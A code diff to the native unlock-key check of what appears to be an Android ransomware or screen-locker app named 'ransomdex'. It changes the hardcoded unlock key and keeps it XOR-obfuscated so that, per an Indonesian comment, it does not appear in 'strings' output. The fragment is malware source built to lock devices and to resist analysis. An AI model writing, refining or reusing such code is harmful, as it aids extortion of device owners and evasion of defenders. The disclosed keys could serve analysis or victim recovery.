@@ -108,18 +108,20 @@ Java_com_bondex_ransomdex_LockerService_verifyAdvancedKey(JNIEnv* env, jobject t
     const char* nativeInput = env->GetStringUTFChars(input, nullptr);
     std::string inputStr(nativeInput);
 
-    // Kunci Rahasia Obfuskasi: "dexambajut4444"
-    // Disimpan dalam bentuk ter-XOR agar tidak muncul di command 'strings'
+    // Kunci Baru: "02042009" (8 Karakter)
+    // Hasil XOR dengan 0x0E:
+    // '0'^0x0E = 0x3E, '2'^0x0E = 0x3C, dst.
     unsigned char obfuscated_key[] = {
-        0x6A, 0x6B, 0x76, 0x6F, 0x63, 0x6C, 0x6F, 0x64, 0x7B, 0x7A, 0x3A, 0x3A, 0x3A, 0x3A
+        0x3E, 0x3C, 0x3E, 0x3A, 0x3C, 0x3E, 0x3E, 0x37
     };
-    size_t key_len = 14;
+    size_t key_len = 8;
 
     bool isValid = false;
     if (inputStr.length() == key_len) {
         isValid = true;
         for (size_t i = 0; i < key_len; i++) {
-            if (inputStr[i] != (obfuscated_key[i] ^ 0x0E)) {
+            // Melakukan XOR balik untuk verifikasi
+            if (inputStr[i] != (char)(obfuscated_key[i] ^ 0x0E)) {
                 isValid = false;
                 break;
             }
@@ -127,7 +129,5 @@ Java_com_bondex_ransomdex_LockerService_verifyAdvancedKey(JNIEnv* env, jobject t
     }
 
     env->ReleaseStringUTFChars(input, nativeInput);
-
-    if (isValid) return JNI_TRUE;
-    return JNI_FALSE;
+    return isValid ? JNI_TRUE : JNI_FALSE;
 }
